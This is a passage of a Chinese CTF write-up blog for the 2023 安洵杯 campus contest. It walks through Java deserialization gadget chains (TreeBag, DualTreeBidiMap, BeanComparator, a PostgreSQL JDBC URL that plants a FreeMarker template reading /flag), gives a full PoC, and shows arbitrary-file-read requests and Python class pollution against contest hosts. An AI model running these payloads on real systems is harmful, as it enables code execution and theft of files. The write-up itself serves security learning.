+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithoutConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    <span class="hljs-keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="hljs-built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    Constructor&lt;? <span class="hljs-built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);
+    objCons.setAccessible(<span class="hljs-literal">true</span>);
+    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
+    sc.setAccessible(<span class="hljs-literal">true</span>);
+    <span class="hljs-keyword">return</span> (T) sc.newInstance(consArgs);
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;
+    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+    <span class="hljs-keyword">try</span> &#123;
+        field = clazz.getDeclaredField(fieldName);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+    &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;
+        <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)
+            field = getField(clazz.getSuperclass(), fieldName);
+    &#125;
+    <span class="hljs-keyword">return</span> field;
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);
+    field.setAccessible(<span class="hljs-literal">true</span>);
+    <span class="hljs-keyword">if</span>(field != <span class="hljs-literal">null</span>) &#123;
+        field.set(obj, value);
+    &#125;
+&#125;</code></pre></div>
+
+<h4 id="分析流程-（以TemplatesImpl的getter讲解）"><a href="#分析流程-（以TemplatesImpl的getter讲解）" class="headerlink" title="分析流程  （以TemplatesImpl的getter讲解）"></a>分析流程  （以TemplatesImpl的getter讲解）</h4><p>先看看代替<code>PriorityQueue</code>的这部分</p>
+<div class="code-wrapper"><pre><code class="hljs">TreeBag treeBag = new TreeBag(comparator);
+TreeMap&lt;Object,Object&gt; m = new TreeMap&lt;&gt;();
+setFieldValue(m, &quot;size&quot;, 2);
+setFieldValue(m, &quot;modCount&quot;, 2);
+Class&lt;?&gt; nodeC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);
+Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
+nodeCons.setAccessible(true);
+Object MutableInteger = createWithoutConstructor(&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;);
+Object node = nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, null);
+Object right = nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);
+setFieldValue(node, &quot;right&quot;, right);
+setFieldValue(m, &quot;root&quot;, node);
+setFieldValue(m, &quot;comparator&quot;, comparator);
+setFieldValue(treeBag,&quot;map&quot;,m);
+</code></pre></div>
+<p>TreeBag调用父类doReadObject</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226104947897.png" srcset="/img/loading.gif" lazyload alt="image-20231226104947897"></p>
+<p>设置map为TreeMap，调用TreeMap的put方法</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105035662.png" srcset="/img/loading.gif" lazyload alt="image-20231226105035662"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105133981.png" srcset="/img/loading.gif" lazyload alt="image-20231226105133981"></p>
+<p>令<code>comparator</code>为<code>BeanComparator</code>即可</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105150232.png" srcset="/img/loading.gif" lazyload alt="image-20231226105150232"></p>
+<p>以上大概就是执行流程，下面看看该如何写出poc</p>
+<p>注意参数k1,k2要控制为<code>TemplatesImpl</code>类，往上可以追溯到</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105035662.png" srcset="/img/loading.gif" lazyload></p>
+<p>即obj应为<code>TemplatesImpl</code>类</p>
+<p>并且前面也有个readObject</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113132550.png" srcset="/img/loading.gif" lazyload alt="image-20231226113132550"></p>
+<p>所以看看writeObject干了什么</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113437650.png" srcset="/img/loading.gif" lazyload alt="image-20231226113437650"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113555944.png" srcset="/img/loading.gif" lazyload alt="image-20231226113555944"></p>
+<p>获取到的是TreeMap的comparator，因为后面要调用comparator.compare，所以comparator为<code>BeanComparator</code>，接着看</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226114031067.png" srcset="/img/loading.gif" lazyload alt="image-20231226114031067"></p>
+<p>跟进iterator()</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226163620650.png" srcset="/img/loading.gif" lazyload alt="image-20231226163620650"></p>
+<p>继续跟进getFirstEntry()</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226163843117.png" srcset="/img/loading.gif" lazyload alt="image-20231226163843117"></p>
+<p>要保证<code>doWriteObject</code>能够正常遍历，要使<code>root</code>的值为<code>java.util.TreeMap$Entry</code>的实例</p>
+<p>不然无法遍历就无法<code>writeObject</code>，在<code>doReadObejct</code>时的<code>readObject</code>就会出现异常</p>
+<p>并且前面<code>doReadObject</code>说了<code>obj=in.readObject</code>应为<code>TemplatesImpl</code>类，所以<code>root</code>的<code>key</code>应为我们构造的恶意<code>TemplatesImpl</code></p>
+<p><code>root</code>的<code>value</code>因为要转化为<code>MutableInteger</code>类，所以我们传入<code>value</code>时直接传入<code>MutableInteger</code>类的实例即可 （转化不报错都行）</p>
+<p>对应poc中的</p>
+<div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; nodeC = Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);
+
+<span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
+nodeCons.setAccessible(<span class="hljs-literal">true</span>);
+
+<span class="hljs-type">Object</span> <span class="hljs-variable">MutableInteger</span> <span class="hljs-operator">=</span> createWithoutConstructor(<span class="hljs-string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);
+
+<span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCons.newInstance(obj,MutableInteger, <span class="hljs-literal">null</span>);  <span class="hljs-comment">//obj为恶意的TemplatesImpl</span>
+
+setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);</code></pre></div>
+
+<p>应该就差不多了</p>
+<p>在调试过程中发现原来反射是只有在序列化时的赋值，对于反序列化过程，只有被<code>writeObject</code>等写入数据流的才能在反序列化中读取到数据</p>
+<p>在这里，TreeMap和TreeBag能利用，实际上是相当于说他们的环境实际上已经配好了，我们就写入一些数据让他满足条件即可</p>
+<p>比如</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226170004784.png" srcset="/img/loading.gif" lazyload alt="image-20231226170004784"></p>
+<p>这个map是<code>TreeMap</code>是因为</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226170040751.png" srcset="/img/loading.gif" lazyload alt="image-20231226170040751"></p>
+<p>而与我们的操作无关，我们控制的是<code>readObject</code>能获取的值</p>
+<p>算了，不说了，说多了误导人</p>
+<h3 id="DualTreeBidiMap"><a href="#DualTreeBidiMap" class="headerlink" title="DualTreeBidiMap"></a>DualTreeBidiMap</h3><h4 id="getter-2"><a href="#getter-2" class="headerlink" title="getter"></a>getter</h4><p><code>BaseDataSource</code>是抽象类，找到它的子类：<code>PGSimpleDataSource</code></p>
+<p>其实都一样，找个<code>BaseDataSource</code>的实现类就行</p>
+<h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.bidimap.AbstractDualBidiMap;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.bidimap.DualTreeBidiMap;
+<span class="hljs-keyword">import</span> org.postgresql.ds.PGSimpleDataSource;
+
+<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.Base64;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayloads</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">loggerLevel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;debug&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">loggerFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;templates/index.ftl&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">shellContent</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;  &lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;    &lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;      &lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;&lt;#assign value=\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;java.io.FileReader\&quot;,\&quot;/flag\&quot;)&gt;$&#123;\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;java.util.Scanner\&quot;,value).useDelimiter(\&quot;\\\\Aasd\&quot;).next()&#125;&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="hljs-string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="hljs-string">&quot;&amp;&quot;</span>+shellContent;
+
+        <span class="hljs-type">PGSimpleDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGSimpleDataSource</span>();
+        dataSource.setUrl(command);
+
+        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;connection&quot;</span>, String.CASE_INSENSITIVE_ORDER);
+        <span class="hljs-type">DualTreeBidiMap</span> <span class="hljs-variable">dualTreeBidiMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DualTreeBidiMap</span>();
+        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
+        map.put(dataSource, dataSource);
+
+        setValue(dualTreeBidiMap, <span class="hljs-string">&quot;comparator&quot;</span>, beanComparator);
+
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> AbstractDualBidiMap.class.getDeclaredField(<span class="hljs-string">&quot;maps&quot;</span>);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        Map[] maps = (Map[]) field.get(dualTreeBidiMap);
+        maps[<span class="hljs-number">0</span>] = map;
+
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);
+        objectOutputStream.writeObject(dualTreeBidiMap);
+        objectOutputStream.close();
+        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();
+        <span class="hljs-comment">// base64 poc</span>
+        System.out.println(Base64.getEncoder().encodeToString(byteArray));
+    &#125;
+&#125;</code></pre></div>
+
+<h4 id="分析流程-（以TemplatesImpl的getter讲解）-1"><a href="#分析流程-（以TemplatesImpl的getter讲解）-1" class="headerlink" title="分析流程  （以TemplatesImpl的getter讲解）"></a>分析流程  （以TemplatesImpl的getter讲解）</h4><p>大体过程</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192143635.png" srcset="/img/loading.gif" lazyload alt="image-20231226192143635"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192210514.png" srcset="/img/loading.gif" lazyload alt="image-20231226192210514"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192244047.png" srcset="/img/loading.gif" lazyload alt="image-20231226192244047"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192346781.png" srcset="/img/loading.gif" lazyload alt="image-20231226192346781"></p>
+<p>接下来看看如何写出poc</p>
+<p>从put方法看，要使key为恶意<code>TemplatesImpl</code></p>
+<p>接着看putall方法</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192846004.png" srcset="/img/loading.gif" lazyload alt="image-20231226192846004"></p>
+<p>和前面的分析差不多，这里传入的是<code>HashMap</code>，经过iterator后是<code>HashMap$Node</code></p>
+<p>前一个方法是<code>java.util.TreeMap$Entry</code>，都继承了<code>Map.Entry</code></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192951705.png" srcset="/img/loading.gif" lazyload alt="image-20231226192951705"></p>
+<p>就正常给<code>HashMap</code>的实例<code>put</code>进恶意<code>TemplatesImpl</code>即可</p>
+<div class="code-wrapper"><pre><code class="hljs">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(dataSource, dataSource);
+</code></pre></div>
+<p>然后</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193514249.png" srcset="/img/loading.gif" lazyload alt="image-20231226193514249"></p>
+<p>很明显，我们反射控制<code>maps[0]</code>为<code>HashMap</code>的实例即可控制map为<code>HashMap</code></p>
+<p>有意思的是</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193719022.png" srcset="/img/loading.gif" lazyload alt="image-20231226193719022"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193741884.png" srcset="/img/loading.gif" lazyload alt="image-20231226193741884"></p>
+<p>看这两处地方，等于说是环境已经配好，我们控制反序列化数据即可</p>
+<p>和前一个分析差不多</p>
+<p>其实理论上讲<code>HashMap</code>应该可以使用上面<code>TreeMap$Entry</code>的方式进行替代，我懒得想了，你可以试试</p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230750413.png" srcset="/img/loading.gif" lazyload alt="image-20231226230750413"></p>
+<p>exp拿去url编码</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230829491.png" srcset="/img/loading.gif" lazyload alt="image-20231226230829491"></p>
+<p>然后访问<code>/</code>目录</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230923364.png" srcset="/img/loading.gif" lazyload alt="image-20231226230923364"></p>
+<p>先列目录，最好查看源代码，先找到结果生成的位置，位于两红框中间</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230717560.png" srcset="/img/loading.gif" lazyload alt="image-20231226230717560"></p>
+<h2 id="ai-java-不懂，先欠着"><a href="#ai-java-不懂，先欠着" class="headerlink" title="ai_java (不懂，先欠着)"></a>ai_java (不懂，先欠着)</h2><div class="code-wrapper"><pre><code class="hljs x86asm">亲爱的朋友，
+
+如果你正在阅读这封信，那意味着我已经离开了这个世界，而你是唯一一个我能相信的人。我希望你能理解我为什么选择以这种方式与你联系。
+
+在我最近的研究中，我发现了一些关于人工智能存在的漏洞，这些漏洞可能导致AI系统在某些情况下出现异常行为甚至失控。这些发现对AI行业和整个社会都有巨大的影响。然而，我发现了一些令人不安的迹象，似乎有人对我的研究产生了浓厚的兴趣，并试图阻止我揭示这些漏洞。
+
+我收到了匿名威胁，警告我停止研究并销毁所有相关的数据和成果。但我不能就此罢手，因为这个发现对人类的未来至关重要。我已经采取了一些措施来保护我的研究成果，但我知道这可能不够。
+
+如果我在某个时候离奇死亡，请你继续我的事业。我相信你的技术能力和正直的品质，你是唯一一个我能信任的人。我已经将我的研究备忘录和重要的数据存放在加密文件中，并将其隐藏在一个安全的位置。这个位置只有你知道，密钥我放在公司服务器了，帐号是TvT/TvT，相关线索我都放在<span class="hljs-keyword">js</span>代码中了。我相信以你的能力可以轻易的获取他。我希望你能找到它，将文件解密。并将它带到公众的视野中。
+
+请小心行事，并确保你的安全。这是一项危险的任务，但我们不能让那些企图掩盖真相的人得逞。我相信你能理解这个事业的重要性，并为之奋斗到底。
+
+感谢你一直以来的支持和友谊。请记住，无论发生什么，我们都必须追求真相和正义。
+
+祝你好运。
+
+真诚的，
+Jonathan
+</code></pre></div>
+
+<p>都是废话，关键就一句</p>
+<div class="code-wrapper"><pre><code class="hljs x86asm">帐号是TvT/TvT，相关线索我都放在<span class="hljs-keyword">js</span>代码中了</code></pre></div>
+
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226194748123.png" srcset="/img/loading.gif" lazyload alt="image-20231226194748123"></p>
+<p>有一段jsfuck，控制台运行，弹出个<code>c</code>，不理解</p>
+<p>然后看到有一个函数叫c，控制台执行c函数，出现了github的链接，忘截图了</p>
+<p>他commit了四次，在第二次增加文件的地方打开能下载jar包       （就做到这里了，没时间看了）</p>
+<p>官方wp</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226195221950.png" srcset="/img/loading.gif" lazyload alt="image-20231226195221950"></p>
+<p>git切换版本下载文件</p>
+<h2 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h2><p>读文档</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234244580.png" srcset="/img/loading.gif" lazyload alt="image-20231226234244580"></p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-attr">&quot;definitions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;UserRegistration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
+            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
+            <span class="hljs-punctuation">&#125;</span>
+        <span class="hljs-punctuation">&#125;</span>
+    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;UserLogin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
+            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
+            <span class="hljs-punctuation">&#125;</span>
+        <span class="hljs-punctuation">&#125;</span>
+    <span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span></code></pre></div>
+
+
+
+<p>所以传参的参数为<code>username</code>和<code>password</code></p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0/register
+&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;</code></pre></div>
+
+
+
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0/login
+&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;</code></pre></div>
+
+<p><code>/api-base/v0/search</code>接口存在任意文件读取</p>
+<p>接下来和CNSS招新赛一道题差不多</p>
+<p>读进程</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>proc<span class="hljs-regexp">/1/</span>cmdline&amp;type=text</code></pre></div>
+
+<p>读源码</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/run.sh&amp;type=text
+
+http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/app.py&amp;type=text
+
+<span class="hljs-regexp">//</span>不知道有什么用
+http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/api.py&amp;type=text</code></pre></div>
+
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>源码中存在</p>
+<div class="code-wrapper"><pre><code class="hljs xquery">def <span class="hljs-keyword">update</span>(src, dst):
+    <span class="hljs-keyword">if</span> hasattr(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):
+        <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span> <span class="hljs-keyword">in</span> src:
+            <span class="hljs-keyword">if</span> isinstance(src<span class="hljs-built_in">[key</span>], dict):
+                 <span class="hljs-keyword">if</span><span class="hljs-built_in"> key</span> <span class="hljs-keyword">in</span> dst <span class="hljs-keyword">and</span> isinstance(src<span class="hljs-built_in">[key</span>], dict):
+                    <span class="hljs-keyword">update</span>(src<span class="hljs-built_in">[key</span>], dst<span class="hljs-built_in">[key</span>])
+                 else:
+                     dst<span class="hljs-built_in">[key</span>] = src<span class="hljs-built_in">[key</span>]
+            else:
+                dst<span class="hljs-built_in">[key</span>] = src<span class="hljs-built_in">[key</span>]
+    else:
+        <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span> <span class="hljs-keyword">in</span> src.items() :
+            <span class="hljs-keyword">if</span> hasattr(dst<span class="hljs-built_in">,key</span>) <span class="hljs-keyword">and</span> isinstance(<span class="hljs-keyword">value</span>, dict):
+                <span class="hljs-keyword">update</span>(<span class="hljs-keyword">value</span>,getattr(dst,<span class="hljs-built_in"> key</span>))
+            else:
+                setattr(dst,<span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span>)
+</code></pre></div>
+
+<p>直接python原型链污染</p>
+<p>官方wp给出一位师傅的wp</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234721487.png" srcset="/img/loading.gif" lazyload alt="image-20231226234721487"></p>
+<p>我一看就知道是<a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/#toc_jinja">Python原型链污染变体(prototype-pollution-in-python) - 跳跳糖 (tttang.com)</a>这一篇文章的</p>
+<p>可惜了Boogipop大佬没试出来</p>
